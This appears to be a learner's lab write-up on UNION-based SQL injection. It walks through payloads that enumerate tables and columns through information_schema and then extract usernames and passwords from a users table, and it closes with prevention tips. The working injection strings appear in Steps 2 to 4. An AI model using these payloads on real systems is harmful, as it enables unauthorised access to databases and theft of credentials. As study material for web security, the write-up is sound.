# 💉 SQL Injection - Listing Database Contents (Non-Oracle)


Learned how to enumerate tables and columns using SQL Injection.

---

## 🔍 Step 1: Goal

Extract:

* Table names
* Column names
* Sensitive data

---

## ⚔️ Step 2: Find Tables

```sql
' UNION SELECT table_name, NULL FROM information_schema.tables--
```

---

## 🧠 Explanation

* `information_schema.tables` → contains table names

---

## ⚔️ Step 3: Find Columns

```sql
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--
```

---

## ⚔️ Step 4: Extract Data

```sql
' UNION SELECT username, password FROM users--
```

---

## 🚀 Result

Page displayed:

```text
admin : password123
carlos : qwerty
```

---

## 🏁 Final Result

Successfully extracted:

* Tables
* Columns
* User credentials

---

## 🧠 Key Learnings

* `information_schema` is key for enumeration
* SQLi can expose entire database
* Data extraction is final stage of attack

---

## 🔐 Prevention

* Least privilege DB access
* Input validation
* Prepared statements

---

## 🔥 Insight

> SQL Injection doesn’t just bypass — it exposes everything inside the database.
